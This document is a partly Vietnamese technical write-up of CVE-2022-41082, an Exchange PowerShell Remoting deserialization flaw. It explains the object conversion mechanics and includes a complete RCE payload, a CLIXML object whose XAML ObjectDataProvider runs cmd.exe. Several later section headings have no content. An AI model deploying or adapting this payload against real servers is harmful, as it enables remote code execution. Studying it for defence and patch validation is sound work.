# CVE-2022-41082

## **Part 2: PowerShell Remoting Objects Conversions – Be Careful or Be Pwned (CVE-2022-41082)**

## 1. **PowerShell Remoting Conversions Basics and Exchange Converters**

Có 2 kiểu object trong PowerShell Remoting

primitive type objects:

```xml
<S>mystring</S> -> string

<BA>Ynl0ZWFycmF5Cg==</BA> -> byte array in form of a base64 encoded string
```

complex objects

```xml
<Obj RefId="RefId-0">
    <TN RefId="RefId-0">
        <T>System.Drawing.Point</T>
        <T>System.ValueType</T>
        <T>System.Object</T>
    </TN>
    <Props>
        <B N="IsEmpty">false</B>
        <I32 N="X">12</I32>
        <I32 N="Y">34</I32>
    </Props>
</Obj>
```

Có “Obj” tag, và tag “TN”, “T” để xác định kiểu object. Như trên là `System.Drawing.Point` **kế thừa từ `System.ValueType`.

“Props” tag chứa properties của object.

Deserialize object như nào? Rất phức tạp, tóm gọn lại ở 2 phần chính:

- Verifying if the specified type can be deserialized, kiểm tra file:
  - Exchange.types.ps1xml
  - Exchange.partial.types.ps1xml
- deserialize the object:
  - Retrieve properties/member sets, deserializing complex values if necessary.
  - Verify that this type is allowed to be deserialized.
  - If yes, perform the conversion.

PowerShell Remoting có nhiều converter để deserialize, để quyết định dùng converter nào, sẽ dùng hàm

```xml
System.Management.Automation.LanguagePrimitives.FigureConversion(Type fromType, Type toType)
```

Một số converter thú vị:

- ConvertViaParseMethod – invokes *Parse(String)* method on the target type. In this case, we control the string argument.
- ConvertViaConstructor – invokes the single-argument constructor that accepts an argument of type *fromType.* In this case, we can control the argument, but limitations apply.
- ConvertViaCast – invokes the proper cast operator, which could be an implicit or explicit cast.
- ConvertViaNoArgumentConstructor – invokes the no-argument constructor and sets the public properties using reflection.
- CustomConverter – there are also some custom converters specified.

## 2. **SerializationTypeConverter – Exchange Custom Converter**

Một ví dụ cụ thể trong file `Exchange.types.ps1xml`:

```xml
<Type>
    <Name>Deserialized.Microsoft.Exchange.Data.IPvxAddress</Name>
    <Members>
        <MemberSet>
        <Name>PSStandardMembers</Name>
        <Members>
            <NoteProperty>
            <Name>TargetTypeForDeserialization</Name>
            <Value>Microsoft.Exchange.Data.IPvxAddress</Value>
            </NoteProperty>
        </Members>
        </MemberSet>
    </Members>
</Type>
<Type>
    <Name>Microsoft.Exchange.Data.IPvxAddress</Name>
    <Members>
        <CodeProperty IsHidden="true">
        <Name>SerializationData</Name>
        <GetCodeReference>
            <TypeName>Microsoft.Exchange.Data.SerializationTypeConverter</TypeName>
            <MethodName>GetSerializationData</MethodName>
        </GetCodeReference>
        </CodeProperty>
    </Members>
    <TypeConverter>
        <TypeName>Microsoft.Exchange.Data.SerializationTypeConverter</TypeName>
    </TypeConverter>
</Type>
```

- *Microsoft.Exchange.Data.IPvxAddress*  class **nằm trong danh sách target cho phép
- *TargetTypeForDeserialization* có value là tên class đầy đủ
- Sử dụng CustomConverter: *Microsoft.Exchange.Data.SerializationTypeConverter*

…

## 3. **RCE Payload Walkthrough**

payload:

```xml
<Obj N="Args" RefId="12">
 <TNRef RefId="0" />
 <LST>
  <Obj RefId="13">
   <MS>
    <S N="N">-Identity:</S>
        <!--Object type section-->
    <Obj N="V" RefId="14">
     <TN RefId="2">
     <T>System.ServiceProcess.ServiceController</T>
      <T>System.Object</T>
     </TN>
     <ToString>Object</ToString>
    <!--Object type section end-->
    <!--Properties section-->
     <Props>
      <S N="Name">Type</S>
      <Obj N="TargetTypeForDeserialization">
       <TN RefId="2">
        <T>System.Exception</T>
        <T>System.Object</T>
       </TN>
       <MS>
        <BA N="SerializationData">AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=</BA>
       </MS>
      </Obj>
     </Props>
    <!--Properties section end-->
    <!--Payload section-->
     <S>
                        <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><System:String>cmd.exe</System:String><System:String>/c whoami > C:\\poc.txt</System:String> </ObjectDataProvider.MethodParameters> </ObjectDataProvider> </ResourceDictionary>]]>
     </S>
    <!--Payload section end-->
    </Obj>
   </MS>
  </Obj>
 </LST>
</Obj>
```

## 4. **Getting Control over TargetTypeForDeserialization**

## 5. **Getting Code Execution Through XamlReader, or Any Other Class**

## 6. Summary
